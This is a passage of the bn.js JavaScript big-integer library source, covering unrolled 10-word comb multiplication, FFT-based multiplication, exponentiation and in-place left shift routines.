Math.imul(al5, bh1)) | 0;\n    mid = (mid + Math.imul(ah5, bl1)) | 0;\n    hi = (hi + Math.imul(ah5, bh1)) | 0;\n    lo = (lo + Math.imul(al4, bl2)) | 0;\n    mid = (mid + Math.imul(al4, bh2)) | 0;\n    mid = (mid + Math.imul(ah4, bl2)) | 0;\n    hi = (hi + Math.imul(ah4, bh2)) | 0;\n    lo = (lo + Math.imul(al3, bl3)) | 0;\n    mid = (mid + Math.imul(al3, bh3)) | 0;\n    mid = (mid + Math.imul(ah3, bl3)) | 0;\n    hi = (hi + Math.imul(ah3, bh3)) | 0;\n    lo = (lo + Math.imul(al2, bl4)) | 0;\n    mid = (mid + Math.imul(al2, bh4)) | 0;\n    mid = (mid + Math.imul(ah2, bl4)) | 0;\n    hi = (hi + Math.imul(ah2, bh4)) | 0;\n    lo = (lo + Math.imul(al1, bl5)) | 0;\n    mid = (mid + Math.imul(al1, bh5)) | 0;\n    mid = (mid + Math.imul(ah1, bl5)) | 0;\n    hi = (hi + Math.imul(ah1, bh5)) | 0;\n    lo = (lo + Math.imul(al0, bl6)) | 0;\n    mid = (mid + Math.imul(al0, bh6)) | 0;\n    mid = (mid + Math.imul(ah0, bl6)) | 0;\n    hi = (hi + Math.imul(ah0, bh6)) | 0;\n    var w6 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0;\n    w6 &= 0x3ffffff;\n    /* k = 7 */\n    lo = Math.imul(al7, bl0);\n    mid = Math.imul(al7, bh0);\n    mid = (mid + Math.imul(ah7, bl0)) | 0;\n    hi = Math.imul(ah7, bh0);\n    lo = (lo + Math.imul(al6, bl1)) | 0;\n    mid = (mid + Math.imul(al6, bh1)) | 0;\n    mid = (mid + Math.imul(ah6, bl1)) | 0;\n    hi = (hi + Math.imul(ah6, bh1)) | 0;\n    lo = (lo + Math.imul(al5, bl2)) | 0;\n    mid = (mid + Math.imul(al5, bh2)) | 0;\n    mid = (mid + Math.imul(ah5, bl2)) | 0;\n    hi = (hi + Math.imul(ah5, bh2)) | 0;\n    lo = (lo + Math.imul(al4, bl3)) | 0;\n    mid = (mid + Math.imul(al4, bh3)) | 0;\n    mid = (mid + Math.imul(ah4, bl3)) | 0;\n    hi = (hi + Math.imul(ah4, bh3)) | 0;\n    lo = (lo + Math.imul(al3, bl4)) | 0;\n    mid = (mid + Math.imul(al3, bh4)) | 0;\n    mid = (mid + Math.imul(ah3, bl4)) | 0;\n    hi = (hi + Math.imul(ah3, bh4)) | 0;\n    lo = (lo + Math.imul(al2, bl5)) | 0;\n    mid = (mid + Math.imul(al2, bh5)) | 0;\n    mid = (mid + Math.imul(ah2, bl5)) | 0;\n    hi = (hi + Math.imul(ah2, bh5)) | 0;\n    lo = (lo + Math.imul(al1, bl6)) | 0;\n    mid = (mid + Math.imul(al1, bh6)) | 0;\n    mid = (mid + Math.imul(ah1, bl6)) | 0;\n    hi = (hi + Math.imul(ah1, bh6)) | 0;\n    lo = (lo + Math.imul(al0, bl7)) | 0;\n    mid = (mid + Math.imul(al0, bh7)) | 0;\n    mid = (mid + Math.imul(ah0, bl7)) | 0;\n    hi = (hi + Math.imul(ah0, bh7)) | 0;\n    var w7 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0;\n    w7 &= 0x3ffffff;\n    /* k = 8 */\n    lo = Math.imul(al8, bl0);\n    mid = Math.imul(al8, bh0);\n    mid = (mid + Math.imul(ah8, bl0)) | 0;\n    hi = Math.imul(ah8, bh0);\n    lo = (lo + Math.imul(al7, bl1)) | 0;\n    mid = (mid + Math.imul(al7, bh1)) | 0;\n    mid = (mid + Math.imul(ah7, bl1)) | 0;\n    hi = (hi + Math.imul(ah7, bh1)) | 0;\n    lo = (lo + Math.imul(al6, bl2)) | 0;\n    mid = (mid + Math.imul(al6, bh2)) | 0;\n    mid = (mid + Math.imul(ah6, bl2)) | 0;\n    hi = (hi + Math.imul(ah6, bh2)) | 0;\n    lo = (lo + Math.imul(al5, bl3)) | 0;\n    mid = (mid + Math.imul(al5, bh3)) | 0;\n    mid = (mid + Math.imul(ah5, bl3)) | 0;\n    hi = (hi + Math.imul(ah5, bh3)) | 0;\n    lo = (lo + Math.imul(al4, bl4)) | 0;\n    mid = (mid + Math.imul(al4, bh4)) | 0;\n    mid = (mid + Math.imul(ah4, bl4)) | 0;\n    hi = (hi + Math.imul(ah4, bh4)) | 0;\n    lo = (lo + Math.imul(al3, bl5)) | 0;\n    mid = (mid + Math.imul(al3, bh5)) | 0;\n    mid = (mid + Math.imul(ah3, bl5)) | 0;\n    hi = (hi + Math.imul(ah3, bh5)) | 0;\n    lo = (lo + Math.imul(al2, bl6)) | 0;\n    mid = (mid + Math.imul(al2, bh6)) | 0;\n    mid = (mid + Math.imul(ah2, bl6)) | 0;\n    hi = (hi + Math.imul(ah2, bh6)) | 0;\n    lo = (lo + Math.imul(al1, bl7)) | 0;\n    mid = (mid + Math.imul(al1, bh7)) | 0;\n    mid = (mid + Math.imul(ah1, bl7)) | 0;\n    hi = (hi + Math.imul(ah1, bh7)) | 0;\n    lo = (lo + Math.imul(al0, bl8)) | 0;\n    mid = (mid + Math.imul(al0, bh8)) | 0;\n    mid = (mid + Math.imul(ah0, bl8)) | 0;\n    hi = (hi + Math.imul(ah0, bh8)) | 0;\n    var w8 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0;\n    w8 &= 0x3ffffff;\n    /* k = 9 */\n    lo = Math.imul(al9, bl0);\n    mid = Math.imul(al9, bh0);\n    mid = (mid + Math.imul(ah9, bl0)) | 0;\n    hi = Math.imul(ah9, bh0);\n    lo = (lo + Math.imul(al8, bl1)) | 0;\n    mid = (mid + Math.imul(al8, bh1)) | 0;\n    mid = (mid + Math.imul(ah8, bl1)) | 0;\n    hi = (hi + Math.imul(ah8, bh1)) | 0;\n    lo = (lo + Math.imul(al7, bl2)) | 0;\n    mid = (mid + Math.imul(al7, bh2)) | 0;\n    mid = (mid + Math.imul(ah7, bl2)) | 0;\n    hi = (hi + Math.imul(ah7, bh2)) | 0;\n    lo = (lo + Math.imul(al6, bl3)) | 0;\n    mid = (mid + Math.imul(al6, bh3)) | 0;\n    mid = (mid + Math.imul(ah6, bl3)) | 0;\n    hi = (hi + Math.imul(ah6, bh3)) | 0;\n    lo = (lo + Math.imul(al5, bl4)) | 0;\n    mid = (mid + Math.imul(al5, bh4)) | 0;\n    mid = (mid + Math.imul(ah5, bl4)) | 0;\n    hi = (hi + Math.imul(ah5, bh4)) | 0;\n    lo = (lo + Math.imul(al4, bl5)) | 0;\n    mid = (mid + Math.imul(al4, bh5)) | 0;\n    mid = (mid + Math.imul(ah4, bl5)) | 0;\n    hi = (hi + Math.imul(ah4, bh5)) | 0;\n    lo = (lo + Math.imul(al3, bl6)) | 0;\n    mid = (mid + Math.imul(al3, bh6)) | 0;\n    mid = (mid + Math.imul(ah3, bl6)) | 0;\n    hi = (hi + Math.imul(ah3, bh6)) | 0;\n    lo = (lo + Math.imul(al2, bl7)) | 0;\n    mid = (mid + Math.imul(al2, bh7)) | 0;\n    mid = (mid + Math.imul(ah2, bl7)) | 0;\n    hi = (hi + Math.imul(ah2, bh7)) | 0;\n    lo = (lo + Math.imul(al1, bl8)) | 0;\n    mid = (mid + Math.imul(al1, bh8)) | 0;\n    mid = (mid + Math.imul(ah1, bl8)) | 0;\n    hi = (hi + Math.imul(ah1, bh8)) | 0;\n    lo = (lo + Math.imul(al0, bl9)) | 0;\n    mid = (mid + Math.imul(al0, bh9)) | 0;\n    mid = (mid + Math.imul(ah0, bl9)) | 0;\n    hi = (hi + Math.imul(ah0, bh9)) | 0;\n    var w9 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0;\n    w9 &= 0x3ffffff;\n    /* k = 10 */\n    lo = Math.imul(al9, bl1);\n    mid = Math.imul(al9, bh1);\n    mid = (mid + Math.imul(ah9, bl1)) | 0;\n    hi = Math.imul(ah9, bh1);\n    lo = (lo + Math.imul(al8, bl2)) | 0;\n    mid = (mid + Math.imul(al8, bh2)) | 0;\n    mid = (mid + Math.imul(ah8, bl2)) | 0;\n    hi = (hi + Math.imul(ah8, bh2)) | 0;\n    lo = (lo + Math.imul(al7, bl3)) | 0;\n    mid = (mid + Math.imul(al7, bh3)) | 0;\n    mid = (mid + Math.imul(ah7, bl3)) | 0;\n    hi = (hi + Math.imul(ah7, bh3)) | 0;\n    lo = (lo + Math.imul(al6, bl4)) | 0;\n    mid = (mid + Math.imul(al6, bh4)) | 0;\n    mid = (mid + Math.imul(ah6, bl4)) | 0;\n    hi = (hi + Math.imul(ah6, bh4)) | 0;\n    lo = (lo + Math.imul(al5, bl5)) | 0;\n    mid = (mid + Math.imul(al5, bh5)) | 0;\n    mid = (mid + Math.imul(ah5, bl5)) | 0;\n    hi = (hi + Math.imul(ah5, bh5)) | 0;\n    lo = (lo + Math.imul(al4, bl6)) | 0;\n    mid = (mid + Math.imul(al4, bh6)) | 0;\n    mid = (mid + Math.imul(ah4, bl6)) | 0;\n    hi = (hi + Math.imul(ah4, bh6)) | 0;\n    lo = (lo + Math.imul(al3, bl7)) | 0;\n    mid = (mid + Math.imul(al3, bh7)) | 0;\n    mid = (mid + Math.imul(ah3, bl7)) | 0;\n    hi = (hi + Math.imul(ah3, bh7)) | 0;\n    lo = (lo + Math.imul(al2, bl8)) | 0;\n    mid = (mid + Math.imul(al2, bh8)) | 0;\n    mid = (mid + Math.imul(ah2, bl8)) | 0;\n    hi = (hi + Math.imul(ah2, bh8)) | 0;\n    lo = (lo + Math.imul(al1, bl9)) | 0;\n    mid = (mid + Math.imul(al1, bh9)) | 0;\n    mid = (mid + Math.imul(ah1, bl9)) | 0;\n    hi = (hi + Math.imul(ah1, bh9)) | 0;\n    var w10 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0;\n    w10 &= 0x3ffffff;\n    /* k = 11 */\n    lo = Math.imul(al9, bl2);\n    mid = Math.imul(al9, bh2);\n    mid = (mid + Math.imul(ah9, bl2)) | 0;\n    hi = Math.imul(ah9, bh2);\n    lo = (lo + Math.imul(al8, bl3)) | 0;\n    mid = (mid + Math.imul(al8, bh3)) | 0;\n    mid = (mid + Math.imul(ah8, bl3)) | 0;\n    hi = (hi + Math.imul(ah8, bh3)) | 0;\n    lo = (lo + Math.imul(al7, bl4)) | 0;\n    mid = (mid + Math.imul(al7, bh4)) | 0;\n    mid = (mid + Math.imul(ah7, bl4)) | 0;\n    hi = (hi + Math.imul(ah7, bh4)) | 0;\n    lo = (lo + Math.imul(al6, bl5)) | 0;\n    mid = (mid + Math.imul(al6, bh5)) | 0;\n    mid = (mid + Math.imul(ah6, bl5)) | 0;\n    hi = (hi + Math.imul(ah6, bh5)) | 0;\n    lo = (lo + Math.imul(al5, bl6)) | 0;\n    mid = (mid + Math.imul(al5, bh6)) | 0;\n    mid = (mid + Math.imul(ah5, bl6)) | 0;\n    hi = (hi + Math.imul(ah5, bh6)) | 0;\n    lo = (lo + Math.imul(al4, bl7)) | 0;\n    mid = (mid + Math.imul(al4, bh7)) | 0;\n    mid = (mid + Math.imul(ah4, bl7)) | 0;\n    hi = (hi + Math.imul(ah4, bh7)) | 0;\n    lo = (lo + Math.imul(al3, bl8)) | 0;\n    mid = (mid + Math.imul(al3, bh8)) | 0;\n    mid = (mid + Math.imul(ah3, bl8)) | 0;\n    hi = (hi + Math.imul(ah3, bh8)) | 0;\n    lo = (lo + Math.imul(al2, bl9)) | 0;\n    mid = (mid + Math.imul(al2, bh9)) | 0;\n    mid = (mid + Math.imul(ah2, bl9)) | 0;\n    hi = (hi + Math.imul(ah2, bh9)) | 0;\n    var w11 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0;\n    w11 &= 0x3ffffff;\n    /* k = 12 */\n    lo = Math.imul(al9, bl3);\n    mid = Math.imul(al9, bh3);\n    mid = (mid + Math.imul(ah9, bl3)) | 0;\n    hi = Math.imul(ah9, bh3);\n    lo = (lo + Math.imul(al8, bl4)) | 0;\n    mid = (mid + Math.imul(al8, bh4)) | 0;\n    mid = (mid + Math.imul(ah8, bl4)) | 0;\n    hi = (hi + Math.imul(ah8, bh4)) | 0;\n    lo = (lo + Math.imul(al7, bl5)) | 0;\n    mid = (mid + Math.imul(al7, bh5)) | 0;\n    mid = (mid + Math.imul(ah7, bl5)) | 0;\n    hi = (hi + Math.imul(ah7, bh5)) | 0;\n    lo = (lo + Math.imul(al6, bl6)) | 0;\n    mid = (mid + Math.imul(al6, bh6)) | 0;\n    mid = (mid + Math.imul(ah6, bl6)) | 0;\n    hi = (hi + Math.imul(ah6, bh6)) | 0;\n    lo = (lo + Math.imul(al5, bl7)) | 0;\n    mid = (mid + Math.imul(al5, bh7)) | 0;\n    mid = (mid + Math.imul(ah5, bl7)) | 0;\n    hi = (hi + Math.imul(ah5, bh7)) | 0;\n    lo = (lo + Math.imul(al4, bl8)) | 0;\n    mid = (mid + Math.imul(al4, bh8)) | 0;\n    mid = (mid + Math.imul(ah4, bl8)) | 0;\n    hi = (hi + Math.imul(ah4, bh8)) | 0;\n    lo = (lo + Math.imul(al3, bl9)) | 0;\n    mid = (mid + Math.imul(al3, bh9)) | 0;\n    mid = (mid + Math.imul(ah3, bl9)) | 0;\n    hi = (hi + Math.imul(ah3, bh9)) | 0;\n    var w12 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0;\n    w12 &= 0x3ffffff;\n    /* k = 13 */\n    lo = Math.imul(al9, bl4);\n    mid = Math.imul(al9, bh4);\n    mid = (mid + Math.imul(ah9, bl4)) | 0;\n    hi = Math.imul(ah9, bh4);\n    lo = (lo + Math.imul(al8, bl5)) | 0;\n    mid = (mid + Math.imul(al8, bh5)) | 0;\n    mid = (mid + Math.imul(ah8, bl5)) | 0;\n    hi = (hi + Math.imul(ah8, bh5)) | 0;\n    lo = (lo + Math.imul(al7, bl6)) | 0;\n    mid = (mid + Math.imul(al7, bh6)) | 0;\n    mid = (mid + Math.imul(ah7, bl6)) | 0;\n    hi = (hi + Math.imul(ah7, bh6)) | 0;\n    lo = (lo + Math.imul(al6, bl7)) | 0;\n    mid = (mid + Math.imul(al6, bh7)) | 0;\n    mid = (mid + Math.imul(ah6, bl7)) | 0;\n    hi = (hi + Math.imul(ah6, bh7)) | 0;\n    lo = (lo + Math.imul(al5, bl8)) | 0;\n    mid = (mid + Math.imul(al5, bh8)) | 0;\n    mid = (mid + Math.imul(ah5, bl8)) | 0;\n    hi = (hi + Math.imul(ah5, bh8)) | 0;\n    lo = (lo + Math.imul(al4, bl9)) | 0;\n    mid = (mid + Math.imul(al4, bh9)) | 0;\n    mid = (mid + Math.imul(ah4, bl9)) | 0;\n    hi = (hi + Math.imul(ah4, bh9)) | 0;\n    var w13 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0;\n    w13 &= 0x3ffffff;\n    /* k = 14 */\n    lo = Math.imul(al9, bl5);\n    mid = Math.imul(al9, bh5);\n    mid = (mid + Math.imul(ah9, bl5)) | 0;\n    hi = Math.imul(ah9, bh5);\n    lo = (lo + Math.imul(al8, bl6)) | 0;\n    mid = (mid + Math.imul(al8, bh6)) | 0;\n    mid = (mid + Math.imul(ah8, bl6)) | 0;\n    hi = (hi + Math.imul(ah8, bh6)) | 0;\n    lo = (lo + Math.imul(al7, bl7)) | 0;\n    mid = (mid + Math.imul(al7, bh7)) | 0;\n    mid = (mid + Math.imul(ah7, bl7)) | 0;\n    hi = (hi + Math.imul(ah7, bh7)) | 0;\n    lo = (lo + Math.imul(al6, bl8)) | 0;\n    mid = (mid + Math.imul(al6, bh8)) | 0;\n    mid = (mid + Math.imul(ah6, bl8)) | 0;\n    hi = (hi + Math.imul(ah6, bh8)) | 0;\n    lo = (lo + Math.imul(al5, bl9)) | 0;\n    mid = (mid + Math.imul(al5, bh9)) | 0;\n    mid = (mid + Math.imul(ah5, bl9)) | 0;\n    hi = (hi + Math.imul(ah5, bh9)) | 0;\n    var w14 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0;\n    w14 &= 0x3ffffff;\n    /* k = 15 */\n    lo = Math.imul(al9, bl6);\n    mid = Math.imul(al9, bh6);\n    mid = (mid + Math.imul(ah9, bl6)) | 0;\n    hi = Math.imul(ah9, bh6);\n    lo = (lo + Math.imul(al8, bl7)) | 0;\n    mid = (mid + Math.imul(al8, bh7)) | 0;\n    mid = (mid + Math.imul(ah8, bl7)) | 0;\n    hi = (hi + Math.imul(ah8, bh7)) | 0;\n    lo = (lo + Math.imul(al7, bl8)) | 0;\n    mid = (mid + Math.imul(al7, bh8)) | 0;\n    mid = (mid + Math.imul(ah7, bl8)) | 0;\n    hi = (hi + Math.imul(ah7, bh8)) | 0;\n    lo = (lo + Math.imul(al6, bl9)) | 0;\n    mid = (mid + Math.imul(al6, bh9)) | 0;\n    mid = (mid + Math.imul(ah6, bl9)) | 0;\n    hi = (hi + Math.imul(ah6, bh9)) | 0;\n    var w15 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0;\n    w15 &= 0x3ffffff;\n    /* k = 16 */\n    lo = Math.imul(al9, bl7);\n    mid = Math.imul(al9, bh7);\n    mid = (mid + Math.imul(ah9, bl7)) | 0;\n    hi = Math.imul(ah9, bh7);\n    lo = (lo + Math.imul(al8, bl8)) | 0;\n    mid = (mid + Math.imul(al8, bh8)) | 0;\n    mid = (mid + Math.imul(ah8, bl8)) | 0;\n    hi = (hi + Math.imul(ah8, bh8)) | 0;\n    lo = (lo + Math.imul(al7, bl9)) | 0;\n    mid = (mid + Math.imul(al7, bh9)) | 0;\n    mid = (mid + Math.imul(ah7, bl9)) | 0;\n    hi = (hi + Math.imul(ah7, bh9)) | 0;\n    var w16 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0;\n    w16 &= 0x3ffffff;\n    /* k = 17 */\n    lo = Math.imul(al9, bl8);\n    mid = Math.imul(al9, bh8);\n    mid = (mid + Math.imul(ah9, bl8)) | 0;\n    hi = Math.imul(ah9, bh8);\n    lo = (lo + Math.imul(al8, bl9)) | 0;\n    mid = (mid + Math.imul(al8, bh9)) | 0;\n    mid = (mid + Math.imul(ah8, bl9)) | 0;\n    hi = (hi + Math.imul(ah8, bh9)) | 0;\n    var w17 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0;\n    w17 &= 0x3ffffff;\n    /* k = 18 */\n    lo = Math.imul(al9, bl9);\n    mid = Math.imul(al9, bh9);\n    mid = (mid + Math.imul(ah9, bl9)) | 0;\n    hi = Math.imul(ah9, bh9);\n    var w18 = (((c + lo) | 0) + ((mid & 0x1fff) << 13)) | 0;\n    c = (((hi + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0;\n    w18 &= 0x3ffffff;\n    o[0] = w0;\n    o[1] = w1;\n    o[2] = w2;\n    o[3] = w3;\n    o[4] = w4;\n    o[5] = w5;\n    o[6] = w6;\n    o[7] = w7;\n    o[8] = w8;\n    o[9] = w9;\n    o[10] = w10;\n    o[11] = w11;\n    o[12] = w12;\n    o[13] = w13;\n    o[14] = w14;\n    o[15] = w15;\n    o[16] = w16;\n    o[17] = w17;\n    o[18] = w18;\n    if (c !== 0) {\n      o[19] = c;\n      out.length++;\n    }\n    return out;\n  };\n\n  // Polyfill comb\n  if (!Math.imul) {\n    comb10MulTo = smallMulTo;\n  }\n\n  function bigMulTo (self, num, out) {\n    out.negative = num.negative ^ self.negative;\n    out.length = self.length + num.length;\n\n    var carry = 0;\n    var hncarry = 0;\n    for (var k = 0; k < out.length - 1; k++) {\n      // Sum all words with the same `i + j = k` and accumulate `ncarry`,\n      // note that ncarry could be >= 0x3ffffff\n      var ncarry = hncarry;\n      hncarry = 0;\n      var rword = carry & 0x3ffffff;\n      var maxJ = Math.min(k, num.length - 1);\n      for (var j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {\n        var i = k - j;\n        var a = self.words[i] | 0;\n        var b = num.words[j] | 0;\n        var r = a * b;\n\n        var lo = r & 0x3ffffff;\n        ncarry = (ncarry + ((r / 0x4000000) | 0)) | 0;\n        lo = (lo + rword) | 0;\n        rword = lo & 0x3ffffff;\n        ncarry = (ncarry + (lo >>> 26)) | 0;\n\n        hncarry += ncarry >>> 26;\n        ncarry &= 0x3ffffff;\n      }\n      out.words[k] = rword;\n      carry = ncarry;\n      ncarry = hncarry;\n    }\n    if (carry !== 0) {\n      out.words[k] = carry;\n    } else {\n      out.length--;\n    }\n\n    return out._strip();\n  }\n\n  function jumboMulTo (self, num, out) {\n    // Temporary disable, see https://github.com/indutny/bn.js/issues/211\n    // var fftm = new FFTM();\n    // return fftm.mulp(self, num, out);\n    return bigMulTo(self, num, out);\n  }\n\n  BN.prototype.mulTo = function mulTo (num, out) {\n    var res;\n    var len = this.length + num.length;\n    if (this.length === 10 && num.length === 10) {\n      res = comb10MulTo(this, num, out);\n    } else if (len < 63) {\n      res = smallMulTo(this, num, out);\n    } else if (len < 1024) {\n      res = bigMulTo(this, num, out);\n    } else {\n      res = jumboMulTo(this, num, out);\n    }\n\n    return res;\n  };\n\n  // Cooley-Tukey algorithm for FFT\n  // slightly revisited to rely on looping instead of recursion\n\n  function FFTM (x, y) {\n    this.x = x;\n    this.y = y;\n  }\n\n  FFTM.prototype.makeRBT = function makeRBT (N) {\n    var t = new Array(N);\n    var l = BN.prototype._countBits(N) - 1;\n    for (var i = 0; i < N; i++) {\n      t[i] = this.revBin(i, l, N);\n    }\n\n    return t;\n  };\n\n  // Returns binary-reversed representation of `x`\n  FFTM.prototype.revBin = function revBin (x, l, N) {\n    if (x === 0 || x === N - 1) return x;\n\n    var rb = 0;\n    for (var i = 0; i < l; i++) {\n      rb |= (x & 1) << (l - i - 1);\n      x >>= 1;\n    }\n\n    return rb;\n  };\n\n  // Performs \"tweedling\" phase, therefore 'emulating'\n  // behaviour of the recursive algorithm\n  FFTM.prototype.permute = function permute (rbt, rws, iws, rtws, itws, N) {\n    for (var i = 0; i < N; i++) {\n      rtws[i] = rws[rbt[i]];\n      itws[i] = iws[rbt[i]];\n    }\n  };\n\n  FFTM.prototype.transform = function transform (rws, iws, rtws, itws, N, rbt) {\n    this.permute(rbt, rws, iws, rtws, itws, N);\n\n    for (var s = 1; s < N; s <<= 1) {\n      var l = s << 1;\n\n      var rtwdf = Math.cos(2 * Math.PI / l);\n      var itwdf = Math.sin(2 * Math.PI / l);\n\n      for (var p = 0; p < N; p += l) {\n        var rtwdf_ = rtwdf;\n        var itwdf_ = itwdf;\n\n        for (var j = 0; j < s; j++) {\n          var re = rtws[p + j];\n          var ie = itws[p + j];\n\n          var ro = rtws[p + j + s];\n          var io = itws[p + j + s];\n\n          var rx = rtwdf_ * ro - itwdf_ * io;\n\n          io = rtwdf_ * io + itwdf_ * ro;\n          ro = rx;\n\n          rtws[p + j] = re + ro;\n          itws[p + j] = ie + io;\n\n          rtws[p + j + s] = re - ro;\n          itws[p + j + s] = ie - io;\n\n          /* jshint maxdepth : false */\n          if (j !== l) {\n            rx = rtwdf * rtwdf_ - itwdf * itwdf_;\n\n            itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_;\n            rtwdf_ = rx;\n          }\n        }\n      }\n    }\n  };\n\n  FFTM.prototype.guessLen13b = function guessLen13b (n, m) {\n    var N = Math.max(m, n) | 1;\n    var odd = N & 1;\n    var i = 0;\n    for (N = N / 2 | 0; N; N = N >>> 1) {\n      i++;\n    }\n\n    return 1 << i + 1 + odd;\n  };\n\n  FFTM.prototype.conjugate = function conjugate (rws, iws, N) {\n    if (N <= 1) return;\n\n    for (var i = 0; i < N / 2; i++) {\n      var t = rws[i];\n\n      rws[i] = rws[N - i - 1];\n      rws[N - i - 1] = t;\n\n      t = iws[i];\n\n      iws[i] = -iws[N - i - 1];\n      iws[N - i - 1] = -t;\n    }\n  };\n\n  FFTM.prototype.normalize13b = function normalize13b (ws, N) {\n    var carry = 0;\n    for (var i = 0; i < N / 2; i++) {\n      var w = Math.round(ws[2 * i + 1] / N) * 0x2000 +\n        Math.round(ws[2 * i] / N) +\n        carry;\n\n      ws[i] = w & 0x3ffffff;\n\n      if (w < 0x4000000) {\n        carry = 0;\n      } else {\n        carry = w / 0x4000000 | 0;\n      }\n    }\n\n    return ws;\n  };\n\n  FFTM.prototype.convert13b = function convert13b (ws, len, rws, N) {\n    var carry = 0;\n    for (var i = 0; i < len; i++) {\n      carry = carry + (ws[i] | 0);\n\n      rws[2 * i] = carry & 0x1fff; carry = carry >>> 13;\n      rws[2 * i + 1] = carry & 0x1fff; carry = carry >>> 13;\n    }\n\n    // Pad with zeroes\n    for (i = 2 * len; i < N; ++i) {\n      rws[i] = 0;\n    }\n\n    assert(carry === 0);\n    assert((carry & ~0x1fff) === 0);\n  };\n\n  FFTM.prototype.stub = function stub (N) {\n    var ph = new Array(N);\n    for (var i = 0; i < N; i++) {\n      ph[i] = 0;\n    }\n\n    return ph;\n  };\n\n  FFTM.prototype.mulp = function mulp (x, y, out) {\n    var N = 2 * this.guessLen13b(x.length, y.length);\n\n    var rbt = this.makeRBT(N);\n\n    var _ = this.stub(N);\n\n    var rws = new Array(N);\n    var rwst = new Array(N);\n    var iwst = new Array(N);\n\n    var nrws = new Array(N);\n    var nrwst = new Array(N);\n    var niwst = new Array(N);\n\n    var rmws = out.words;\n    rmws.length = N;\n\n    this.convert13b(x.words, x.length, rws, N);\n    this.convert13b(y.words, y.length, nrws, N);\n\n    this.transform(rws, _, rwst, iwst, N, rbt);\n    this.transform(nrws, _, nrwst, niwst, N, rbt);\n\n    for (var i = 0; i < N; i++) {\n      var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];\n      iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i];\n      rwst[i] = rx;\n    }\n\n    this.conjugate(rwst, iwst, N);\n    this.transform(rwst, iwst, rmws, _, N, rbt);\n    this.conjugate(rmws, _, N);\n    this.normalize13b(rmws, N);\n\n    out.negative = x.negative ^ y.negative;\n    out.length = x.length + y.length;\n    return out._strip();\n  };\n\n  // Multiply `this` by `num`\n  BN.prototype.mul = function mul (num) {\n    var out = new BN(null);\n    out.words = new Array(this.length + num.length);\n    return this.mulTo(num, out);\n  };\n\n  // Multiply employing FFT\n  BN.prototype.mulf = function mulf (num) {\n    var out = new BN(null);\n    out.words = new Array(this.length + num.length);\n    return jumboMulTo(this, num, out);\n  };\n\n  // In-place Multiplication\n  BN.prototype.imul = function imul (num) {\n    return this.clone().mulTo(num, this);\n  };\n\n  BN.prototype.imuln = function imuln (num) {\n    var isNegNum = num < 0;\n    if (isNegNum) num = -num;\n\n    assert(typeof num === 'number');\n    assert(num < 0x4000000);\n\n    // Carry\n    var carry = 0;\n    for (var i = 0; i < this.length; i++) {\n      var w = (this.words[i] | 0) * num;\n      var lo = (w & 0x3ffffff) + (carry & 0x3ffffff);\n      carry >>= 26;\n      carry += (w / 0x4000000) | 0;\n      // NOTE: lo is 27bit maximum\n      carry += lo >>> 26;\n      this.words[i] = lo & 0x3ffffff;\n    }\n\n    if (carry !== 0) {\n      this.words[i] = carry;\n      this.length++;\n    }\n\n    return isNegNum ? this.ineg() : this;\n  };\n\n  BN.prototype.muln = function muln (num) {\n    return this.clone().imuln(num);\n  };\n\n  // `this` * `this`\n  BN.prototype.sqr = function sqr () {\n    return this.mul(this);\n  };\n\n  // `this` * `this` in-place\n  BN.prototype.isqr = function isqr () {\n    return this.imul(this.clone());\n  };\n\n  // Math.pow(`this`, `num`)\n  BN.prototype.pow = function pow (num) {\n    var w = toBitArray(num);\n    if (w.length === 0) return new BN(1);\n\n    // Skip leading zeroes\n    var res = this;\n    for (var i = 0; i < w.length; i++, res = res.sqr()) {\n      if (w[i] !== 0) break;\n    }\n\n    if (++i < w.length) {\n      for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) {\n        if (w[i] === 0) continue;\n\n        res = res.mul(q);\n      }\n    }\n\n    return res;\n  };\n\n  // Shift-left in-place\n  BN.prototype.iushln = function iushln (bits) {\n    assert(typeof bits === 'number' && bits >= 0);\n    var r = bits % 26;\n    var s = (bits - r) / 26;\n    var carryMask = (0x3ffffff >>> (26 - r)) << (26 - r);\n    var i;\n\n    if (r !== 0) {\n      var carry = 0;\n\n      for (i = 0; i < this.length; i++) {\n        var newCarry = this.words[i] & carryMask;\n        var c = ((this.words[i] | 0) - newCarry) << r;\n        this.words[i] = c | carry;\n        carry = newCarry >>> (26 - r);\n      }\n\n      if (carry) {\n        this.words[i] = carry;\n        this.length++;\n      }\n    }\n\n    if (s !== 0) {\n      for (i = this.length - 1; i >= 0; i--) {\n        this.words[i + s] = this.words[i];\n      }\n\n      for (i = 0; i < s; i++) {\n        this.words[i] = 0;\n      }\n\n      this.length += s;\n    }\n\n    return this._strip();\n  };\n\n  